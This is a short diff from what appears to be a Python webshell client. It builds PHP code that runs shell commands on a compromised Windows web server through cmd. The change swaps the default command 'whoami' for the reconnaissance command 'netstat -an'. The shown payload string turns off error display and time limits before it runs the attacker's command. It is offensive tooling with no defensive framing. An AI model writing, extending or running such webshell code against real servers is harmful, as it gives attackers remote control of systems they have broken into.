@@ -93,7 +93,7 @@ class Shell:
         if not dir_path:
             dir_path = self.current_dir_path
         if not command:
-            command = 'whoami'
+            command = 'netstat -an'
         if 'windows' in self.system_info.lower():
             functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$m=get_magic_quotes_gpc();$p='cmd';$s='cd /d """+\
                               dir_path + '&' + command +\
